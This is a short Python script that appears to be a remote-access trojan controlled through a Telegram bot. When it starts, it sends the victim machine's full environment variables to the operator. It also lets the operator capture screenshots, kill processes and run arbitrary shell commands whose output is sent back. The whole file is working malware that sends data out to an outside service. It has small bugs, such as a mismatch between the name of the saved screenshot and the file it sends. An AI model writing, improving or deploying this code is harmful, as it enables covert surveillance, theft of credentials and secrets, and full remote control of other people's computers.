#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, telebot, sys, autopy

reload(sys)
sys.setdefaultencoding("utf-8")

TOKEN = 'TOKEN'

bot = telebot.TeleBot(TOKEN)
sudo = int('YOUR ID')

try:
    aaa = os.environ
    bot.send_message(sudo, str(aaa))
except:
    pass

@bot.message_handler(commands=['shot']) #take screen shot and send it to you
def screen(m):
    bitmap = autopy.bitmap.capture_screen()
    bitmap.save("22222.png")
    bot.reply_to(m, open('screen.png', 'rb'))




@bot.message_handler(commands=['terminate'])
def terminate(m):
    try:
        tl = os.popen("tasklist").readlines()
        for x in tl:
            aa = str(x[:29]).strip()
            bb = str(x[29:35]).strip()
            if aa == '%prog': #the prog name that you want to teminate it in proccess
                g=os.kill(int(bb), int(bb))
            else:
                pass
    except:
        pass


@bot.message_handler(content_types=['text', 'audio', 'document', 'photo', 'sticker', 'video', 'voice', 'location', 'contact', 'new_chat_member', 'left_chat_member', 'new_chat_title', 'new_chat_photo', 'delete_chat_photo', 'group_chat_created'])
def run_cmd(m):
    if m.from_user.id == sudo:
        text=m.text
        try:
            TeXT = str(m.text).split(" ")[0]
            TEXT = str(m.text).strip(TeXT)
            CMD = os.popen(TEXT).read()
            m_id = m.message_id
            cmd_file = open('cmd.txt', 'w')
            cmd_file.write(str(CMD))
            cmd_file.close()
            bot.send_document(m.chat.id, open('cmd.txt', 'rb'), reply_to_message_id=m_id)
        except:
            pass
    else:
        pass
